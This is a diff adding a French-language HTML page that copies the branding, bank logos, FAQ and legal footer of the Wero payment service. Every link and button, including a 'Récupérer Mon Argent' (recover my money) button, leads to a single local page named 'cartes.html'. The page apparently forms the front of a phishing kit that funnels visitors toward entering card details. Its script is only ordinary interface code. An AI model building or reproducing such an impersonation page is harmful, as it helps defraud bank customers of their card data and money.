+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="navbar-container">
+            <div class="logo-container" onclick="window.location.href='cartes.html'">
+                <img id="site-logo" src="images/wero.jpg" alt="Wero" class="hidden">
+                <span id="logo-fallback">wero</span>
+            </div>
+            
+            <button id="mobile-menu-btn">
+                <svg class="burger-icon" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+                </svg>
+            </button>
+
+            <nav class="desktop-nav">
+                <div class="nav-item-dropdown" onclick="window.location.href='cartes.html'">
+                    <span>Utilisateurs</span>
+                    <svg class="dropdown-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                </div>
+                <div class="nav-item-dropdown" onclick="window.location.href='cartes.html'">
+                    <span>Professionnels</span>
+                    <svg class="dropdown-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                </div>
+                <a href="cartes.html" class="nav-link">Aide</a>
+                <a href="cartes.html" class="nav-link text-center leading-tight">À propos</a>
+                <a href="cartes.html" class="nav-link">Actualités</a>
+            </nav>
+
+            <div class="lang-selector" onclick="window.location.href='cartes.html'">FR</div>
+        </div>
+
+        <nav id="mobile-menu">
+            <a href="cartes.html" class="mobile-menu-item">Utilisateurs</a>
+            <a href="cartes.html" class="mobile-menu-item">Professionnels</a>
+            <a href="cartes.html" class="mobile-menu-item">Aide</a>
+            <a href="cartes.html" class="mobile-menu-item">À propos</a>
+            <a href="cartes.html" class="mobile-menu-item">Actualités</a>
+            <a href="cartes.html" id="mobile-menu-fr" style="display: block; text-decoration: none; color: inherit;">FR</a>
+
+            <div class="mobile-menu-buttons">
+                <button class="wero-btn" onclick="window.location.href='cartes.html'">
+                    <div class="wero-btn-content">
+                        <span class="wero-btn-text">Activez Wero maintenant</span>
+                        <span class="wero-btn-icon-container">
+                            <svg class="arrow-svg button-icon" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                            </svg>
+                        </span>
+                    </div>
+                </button>
+                <button class="wero-btn" onclick="window.location.href='cartes.html'">
+                    <div class="wero-btn-content">
+                        <span class="wero-btn-text">Récupérer Mon Argent</span>
+                        <span class="wero-btn-icon-container">
+                            <svg class="arrow-svg button-icon" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                            </svg>
+                        </span>
+                    </div>
+                </button>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        
+        <section class="hero-section">
+            <h1 class="hero-title"><span class="lowercase"></span>EN MOINS DE 10 SECONDES,<br>C'EST RÉGLÉ.</h1>
+            <p class="hero-description">
+                Vos paiements instantanés prennent une nouvelle dimension : 
+                <a href="#" class="inline-underline decoration-1 decoration-black">Paylib</a> 
+                a passé le relais à Wero pour conquérir l'Europe. Wero, c'est la solution de paiement mobile instantané qui permet d'envoyer et recevoir de l'argent en moins de 10 secondes, avec juste un numéro de téléphone. Depuis votre application bancaire ou l'application Wero.
+            </p>
+
+            <div class="hero-buttons-wrapper">
+                <button class="wero-btn" onclick="window.location.href='cartes.html'">
+                    <div class="wero-btn-content">
+                        <span class="wero-btn-text">Activez Wero maintenant</span>
+                        <span class="wero-btn-icon-container">
+                            <svg class="arrow-svg button-icon" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                            </svg>
+                        </span>
+                    </div>
+                </button>
+                
+                <button class="wero-btn" onclick="window.location.href='cartes.html'">
+                    <div class="wero-btn-content">
+                        <span class="wero-btn-text">Récupérer Mon Argent</span>
+                        <span class="wero-btn-icon-container">
+                            <svg class="arrow-svg button-icon" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                            </svg>
+                        </span>
+                    </div>
+                </button>
+            </div>
+        </section>
+
+        <section class="main-image-section">
+            <div id="scroll-trigger">
+                <svg class="scroll-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 14l-7 7-7-7m5-10v18"></path></svg>
+            </div>
+            <img src="images/image1.png" alt="Illustration Wero Europe" class="main-image-content">
+        </section>
+        
+        <section id="details-section" class="grid">
+            <div>
+                <h2 class="details-title">PAYLIB PASSE LE<br>RELAIS À WERO.</h2>
+            </div>
+            <div class="details-text">
+                <p>
+                    Wero a pris le relais de <span class="inline-underline decoration-1 decoration-black">Paylib</span>. En pleine expansion sur le marché français, Wero se prépare également à s'étendre à travers l'Europe. De nombreuses banques françaises proposent déjà ce service innovant. Cela signifie que vous pouvez profiter de Wero dans toute l'Europe. Sa mission ? Vous simplifier la vie. Restez connectés, l'avenir des paiements est à portée de main !
+                </p>
+            </div>
+        </section>
+
+        <section class="ere-section">
+            <h2 class="ere-title">ENTREZ DANS L'ÈRE<br>WERO.</h2>
+            <div class="ere-text-container">
+                <p>
+                    Personne n'aime attendre pour être remboursé – que ce soit pour un verre entre amis, un cadeau de départ pour un collègue ou un dîner en famille. Avec Wero, envoyer et recevoir de l'argent, ça sera facile et instantané, n'importe quand, n'importe où. Et ce n'est pas tout :
+                </p>
+            </div>
+        </section>
+
+        <section class="features-wrapper">
+            <div class="features-grid">
+                <div class="feature-col">
+                    <div class="feature-image-container bg-feature-1">
+                        <img src="images/paylib.png" alt="Paylib et Wero" class="feature-image">
+                    </div>
+                    <div class="feature-text-container">
+                        <h3 class="feature-title">PAYLIB ET WERO.</h3>
+                        <p class="feature-text">Votre banque ou celle de votre interlocuteur utilisait <span class="inline-underline">Paylib</span> ? Désormais, c'est Wero qui prend le relais ! Vous pouvez continuer à envoyer et recevoir de l'argent en toute simplicité avec juste un numéro de mobile, quelle que soit la banque de votre contact.</p>
+                        <p class="feature-text">La transition <span class="inline-underline">Paylib</span> vers Wero désormais achevée, Wero devient la solution unique en France et en Europe pour vos paiements instantanés.</p>
+                    </div>
+                </div>
+
+                <div class="feature-col">
+                    <div class="feature-image-container bg-feature-2">
+                        <img src="images/liberte.png" alt="Liberté financière" class="feature-image">
+                    </div>
+                    <div class="feature-text-container">
+                        <h3 class="feature-title">UNE LIBERTÉ<br>FINANCIÈRE AU-<br>DELÀ DES<br>FRONTIÈRES.</h3>
+                        <p class="feature-text">Bientôt, nos paiements mobiles instantanés traverseront les frontières en toute sécurité : Wero est disponible en France, en Allemagne et en Belgique, puis dans d'autres banques à travers toute l'Europe.</p>
+                    </div>
+                </div>
+
+                <div class="feature-col">
+                    <div class="feature-image-container bg-feature-3">
+                        <img src="images/securite.png" alt="Sécurité" class="feature-image">
+                    </div>
+                    <div class="feature-text-container">
+                        <h3 class="feature-title">UTILISEZ WERO<br>EN TOUTE<br>SÉRÉNITÉ.</h3>
+                        <p class="feature-text">La sécurité de votre argent et de vos données, c'est ce qui passe en premier. Wero est en contact direct avec votre banque, vous permettant ainsi d'envoyer et de recevoir de l'argent en toute tranquillité d'esprit.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="how-it-works-wrapper" style="background-color: #ffffff; padding: 80px 20px;">
+            <div class="how-it-works-container" style="max-width: 1100px; margin: 0 auto; display: flex; flex-wrap: wrap; align-items: center; gap: 40px; background: white; border: 1px solid #e5e5e5; overflow: hidden;">
+                
+                <div class="phone-side" style="flex: 1; min-width: 300px; background: #ffffff; display: flex; justify-content: center;">
+                    <img src="images/telephone.png" alt="Interface Wero" style="max-width: 300px;">
+                </div>
+
+                <div class="instructions-side" style="flex: 1; min-width: 300px; padding: 40px; background-color: #fff69c;">
+                    <h2 style="font-size: 2.25rem; font-weight: 900; line-height: 1.1; margin-bottom: 40px; text-transform: uppercase;">COMMENT ÇA<br>MARCHE?</h2>
+                    
+                    <div class="steps" style="display: flex; flex-direction: column; gap: 25px;">
+                        <div style="display: flex; gap: 15px; align-items: flex-start;">
+                            <span style="width: 25px; height: 25px; background-color: #fff; color: #000; border: 1px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 400; font-size: 0.8rem; flex-shrink: 0;">1</span>
+                            <p style="margin: 0; font-size: 0.9rem; font-weight: 500;">Activez l'application : Trouvez Wero dans votre application bancaire ou dans votre app store.</p>
+                        </div>
+                        <div style="display: flex; gap: 15px; align-items: flex-start;">
+                            <span style="width: 25px; height: 25px; background-color: #fff; color: #000; border: 1px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 400; font-size: 0.8rem; flex-shrink: 0;">2</span>
+                            <p style="margin: 0; font-size: 0.9rem; font-weight: 500;">Choisissez votre compte : Une fois connecté, choisissez le compte bancaire avec lequel vous souhaitez payer.</p>
+                        </div>
+                        <div style="display: flex; gap: 15px; align-items: flex-start;">
+                            <span style="width: 25px; height: 25px; background-color: #fff; color: #000; border: 1px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 400; font-size: 0.8rem; flex-shrink: 0;">3</span>
+                            <p style="margin: 0; font-size: 0.9rem; font-weight: 500;">Choisissez quelqu'un à payer : Saisissez le numéro de mobile ou générez un QR code.</p>
+                        </div>
+                        <div style="display: flex; gap: 15px; align-items: flex-start;">
+                            <span style="width: 25px; height: 25px; background-color: #fff; color: #000; border: 1px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 400; font-size: 0.8rem; flex-shrink: 0;">4</span>
+                            <p style="margin: 0; font-size: 0.9rem; font-weight: 500;">Entrez le montant : Validez, écrivez un message et appuyez sur envoyer !</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="banks-section">
+            <div class="banks-header">
+                <div>
+                    <h2 class="banks-title">
+                        PROPOSÉ PAR LES<br>PRINCIPALES BANQUES<br>FRANÇAISES ET BIENTÔT<br>DISPONIBLE POUR TOUS.
+                    </h2>
+                </div>
+                
+                <div class="banks-text-container">
+                    <p class="banks-text">
+                        Wero est disponible avec toutes ces banques. De nouvelles banques nous rejoignent régulièrement. Si votre banque n'a pas encore rejoint le mouvement Wero, on partage votre frustration. Alors, pourquoi ne pas leur souffler d'accélérer un peu ? On est impatient de vous compter parmi nous !
+                    </p>
+                    
+                    <button class="wero-btn" onclick="window.location.href='cartes.html'">
+                        <div class="wero-btn-content">
+                            <span class="wero-btn-text">Retrouvez votre banque</span>
+                            <span class="wero-btn-icon-container">
+                                <svg class="arrow-svg button-icon" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                                </svg>
+                            </span>
+                        </div>
+                    </button>
+                </div>
+            </div>
+
+            <div class="banks-grid">
+                <img src="images/bcp.png" alt="Banque BCP" class="bank-logo">
+                <img src="images/palatine.png" alt="Banque Palatine" class="bank-logo">
+                <img src="images/banque-populaire.png" alt="Banque Populaire" class="bank-logo">
+                <img src="images/banque-savoie.jpg" alt="Banque de Savoie" class="bank-logo">
+                <img src="images/bnp.jfif" alt="BNP Paribas" class="bank-logo">
+                <img src="images/bred.jpeg" alt="BRED" class="bank-logo">
+                <img src="images/caisse-epargne.png" alt="Caisse d'Epargne" class="bank-logo">
+                <img src="images/cic.png" alt="CIC" class="bank-logo">
+                <img src="images/credit-agricole.svg" alt="Crédit Agricole" class="bank-logo">
+                <img src="images/cooperatif.jpeg" alt="Crédit Coopératif" class="bank-logo">
+                <img src="images/maritime.png" alt="Crédit Maritime" class="bank-logo">
+                <img src="images/fortuneo.svg.png" alt="Fortuneo" class="bank-logo">
+                <img src="images/credit-mutuel.png" alt="Crédit Mutuel" class="bank-logo">
+                <img src="images/cmb.png" alt="Crédit Mutuel de Bretagne" class="bank-logo">
+                <img src="images/cmso.png" alt="Crédit Mutuel du Sud-Ouest" class="bank-logo">
+                <img src="images/hello-bank.png" alt="Hello Bank!" class="bank-logo">
+                <img src="images/banque-postale.png" alt="La Banque Postale" class="bank-logo">
+                <img src="images/lcl.png" alt="LCL" class="bank-logo">
+                <img src="images/bm.jpg" alt="Banque Michel" class="bank-logo">
+                <img src="images/monabanq.png" alt="Monabanq" class="bank-logo">
+                <img src="images/societe-generale.png" alt="Société Générale" class="bank-logo">
+                <img src="images/revolut.jpg" alt="Revolut" class="bank-logo">
+                <img src="images/sme.svg" alt="SME" class="bank-logo">
+            </div>
+        </section>
+
+        <section class="faq-section">
+            <div class="faq-container">
+                <div class="faq-left">
+                    <h2 class="faq-title">DES QUESTIONS, DES RÉPONSES.</h2>
+                    <a href="cartes.html" class="faq-link">Accéder à toute l'aide. ↗</a>
+                </div>
+                <div class="faq-right">
+                    <div class="faq-item">
+                        <button class="faq-question">
+                            <span class="faq-question-text">Quelle est la différence entre Paylib et Wero ?</span>
+                            <span class="faq-icon-container">
+                                <svg class="faq-icon" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </button>
+                        <div class="faq-answer-wrapper">
+                            <div class="faq-answer">
+                                Quasiment aucune : c'est le même service de paiement mobile instantané mais Wero vous propose de nouvelles fonctionnalités tandis que <span class="inline-underline decoration-1 decoration-black">Paylib</span> disparaît. En bref, même utilisation, même vision, nouvelles possibilités. Avec plus de 35 millions d'inscrits, Paylib a participé à démocratiser l'envoi d'argent grâce à son service de paiement mobile 100% français, utile pour régler ses achats du quotidien en magasin sans contact ou rembourser ses amis avec un numéro de téléphone. Wero s'inscrit dans sa lignée et poursuit l'aventure du paiement mobile instantané tout en l'ouvrant à de nouveaux horizons, pour prendre une nouvelle dimension. Ça donne envie, non ?
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="faq-item">
+                        <button class="faq-question">
+                            <span class="faq-question-text">Ce que ça va changer pour moi de passer à Wero ?</span>
+                            <span class="faq-icon-container">
+                                <svg class="faq-icon" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </button>
+                        <div class="faq-answer-wrapper">
+                            <div class="faq-answer">
+                                Vos habitudes de paiement resteront les mêmes, mais avec de nouvelles possibilités à l'échelle européenne et une interface modernisée.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question">
+                            <span class="faq-question-text">Quel est l'intérêt d'utiliser Wero ?</span>
+                            <span class="faq-icon-container">
+                                <svg class="faq-icon" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </button>
+                        <div class="faq-answer-wrapper">
+                            <div class="faq-answer">
+                                Wero simplifie vos transferts d'argent instantanés en toute sécurité, directement via votre application bancaire, sans avoir besoin de RIB.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question">
+                            <span class="faq-question-text">Combien de temps prend un envoi d'argent avec Wero ?</span>
+                            <span class="faq-icon-container">
+                                <svg class="faq-icon" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </button>
+                        <div class="faq-answer-wrapper">
+                            <div class="faq-answer">
+                                L'envoi est instantané. Le bénéficiaire reçoit les fonds sur son compte bancaire en quelques secondes, 24h/24 et 7j/7.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question">
+                            <span class="faq-question-text">Dans quels pays peut-on utiliser Wero ?</span>
+                            <span class="faq-icon-container">
+                                <svg class="faq-icon" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </button>
+                        <div class="faq-answer-wrapper">
+                            <div class="faq-answer">
+                                Wero est actuellement disponible en France, en Allemagne et en Belgique, avec un déploiement prévu dans d'autres pays européens très prochainement.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <button class="faq-question">
+                            <span class="faq-question-text">Comment passer de Paylib à Wero? Comment activer Wero ?</span>
+                            <span class="faq-icon-container">
+                                <svg class="faq-icon" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </button>
+                        <div class="faq-answer-wrapper">
+                            <div class="faq-answer">
+                                Si votre banque propose déjà Wero, il vous suffit de vous rendre dans votre application bancaire habituelle pour activer le service en quelques clics.
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+        
+
+    </main>
+
+    <section class="pre-footer-banner">
+        <h3 class="pre-footer-title">LE FUTUR DES PAIEMENTS EST DÉJÀ LÀ.</h3>
+        <button class="wero-btn" style="background-color: var(--white);" onclick="window.location.href='cartes.html'">
+            <div class="wero-btn-content">
+                <span class="wero-btn-text">Démarrer.</span>
+                <span class="wero-btn-icon-container">
+                    <svg class="arrow-svg button-icon" viewBox="0 0 20 20">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                    </svg>
+                </span>
+            </div>
+        </button>
+    </section>
+
+    <footer class="site-footer">
+        <div class="site-footer-inner">
+            <div class="footer-top">
+                <div class="footer-links-container">
+                    <div class="footer-col">
+                        <div class="footer-heading">Découvrir</div>
+                        <a href="cartes.html" class="footer-link">Accueil</a>
+                        <a href="cartes.html" class="footer-link">Utilisateurs</a>
+                        <a href="cartes.html" class="footer-link">Professionnels</a>
+                        <a href="cartes.html" class="footer-link">Aide</a>
+                        <a href="cartes.html" class="footer-link">À propos</a>
+                        <a href="cartes.html" class="footer-link">Actualités</a>
+                    </div>
+                    <div class="footer-col">
+                        <div class="footer-heading">Informations pratiques</div>
+                        <a href="cartes.html" class="footer-link">Centre de confidentialité</a>
+                        <a href="cartes.html" class="footer-link">Centre Légal</a>
+                        <a href="cartes.html" class="footer-link">Conditions d'utilisation du site web</a>
+                        <a href="cartes.html" class="footer-link">Sécurité</a>
+                        <a href="cartes.html" class="footer-link">Presse</a>
+                    </div>
+                </div>
+                
+                <div class="footer-logo">
+                    <img src="images/wero.jpg" alt="Logo Wero">
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="footer-info">
+                    <p><strong style="color: var(--black);">Wero est un produit de <a href="cartes.html" class="inline-underline">EPI Company SE</a></strong><br>
+                    Disponible en Allemagne, Belgique et France.<br>
+                    De Lignestraat 13, 1000 Brussels, Belgium<br>
+                    VAT: BE0755811726<br>
+                    Capital partagé : € 669MM</p>
+
+                    <p>Détails de la licence : n° 0755.811.726. Autorisé par la Banque Nationale de Belgique<br>
+                    en tant qu'institution de paiement le 20 février 2024. PISP et AISP pour les services (7<br>
+                    services d'initiation de paiement et 8 services d'information sur les comptes).</p>
+                    
+                    <div class="copyright">© 2026 EPI Company SE</div>
+                </div>
+
+                <div class="footer-socials">
+                    <a href="cartes.html" class="social-icon" aria-label="Facebook">
+                        <svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"></path></svg>
+                    </a>
+                    <a href="cartes.html" class="social-icon" aria-label="TikTok">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12a4 4 0 1 0 4 4V4a5 5 0 0 0 5 5"></path><path d="M15 8v8a4 4 0 0 1-4 4"></path><path d="M15 4a4 4 0 0 0 4 4"></path></svg>
+                    </a>
+                    <a href="cartes.html" class="social-icon" aria-label="Instagram">
+                        <svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            
+            // 1. Gestion adaptative du Logo Header
+            const logoImg = document.getElementById("site-logo");
+            const logoFallback = document.getElementById("logo-fallback");
+
+            if (logoImg) {
+                const testImg = new Image();
+                testImg.src = logoImg.src;
+                testImg.onload = () => {
+                    logoImg.classList.remove("hidden");
+                    logoFallback.classList.add("hidden");
+                };
+                testImg.onerror = () => {
+                    logoImg.classList.add("hidden");
+                    logoFallback.classList.remove("hidden");
+                };
+            }
+
+            // 2. Défilement fluide
+            const scrollTrigger = document.getElementById("scroll-trigger");
+            const detailsSection = document.getElementById("details-section");
+
+            if (scrollTrigger && detailsSection) {
+                scrollTrigger.addEventListener("click", () => {
+                    detailsSection.scrollIntoView({ 
+                        behavior: "smooth", 
+                        block: "start" 
+                    });
+                });
+            }
+
+            // 3. Menu Mobile (Mis à jour pour calculer dynamiquement scrollHeight)
+            const mobileBtn = document.getElementById("mobile-menu-btn");
+            const mobileMenu = document.getElementById("mobile-menu");
+            let isMenuOpen = false;
+
+            if (mobileBtn && mobileMenu) {
+                mobileBtn.addEventListener("click", () => {
+                    isMenuOpen = !isMenuOpen;
+                    if (isMenuOpen) {
+                        mobileMenu.style.maxHeight = mobileMenu.scrollHeight + "px";
+                        mobileMenu.style.opacity = "1";
+                        mobileMenu.style.paddingBottom = "1rem";
+                    } else {
+                        mobileMenu.style.maxHeight = "0";
+                        mobileMenu.style.opacity = "0";
+                        mobileMenu.style.paddingBottom = "0";
+                    }
+                });
+            }
+
+            // 4. Gestion de l'Accordéon FAQ
+            const faqItems = document.querySelectorAll('.faq-item');
+            
+            if (faqItems.length > 0) {
+                const firstItem = faqItems[0];
+                firstItem.classList.add('active');
+                const firstAnswer = firstItem.querySelector('.faq-answer-wrapper');
+                firstAnswer.style.maxHeight = firstAnswer.scrollHeight + "px";
+            }
+
+            faqItems.forEach(item => {
+                const questionBtn = item.querySelector('.faq-question');
+                
+                questionBtn.addEventListener('click', () => {
+                    const isActive = item.classList.contains('active');
+                    const answerWrapper = item.querySelector('.faq-answer-wrapper');
+
+                    // Fermer tous les autres éléments
+                    faqItems.forEach(otherItem => {
+                        otherItem.classList.remove('active');
+                        otherItem.querySelector('.faq-answer-wrapper').style.maxHeight = null;
+                    });
+
+                    // Si l'élément cliqué n'était pas actif, l'ouvrir
+                    if (!isActive) {
+                        item.classList.add('active');
+                        answerWrapper.style.maxHeight = answerWrapper.scrollHeight + "px";
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
+
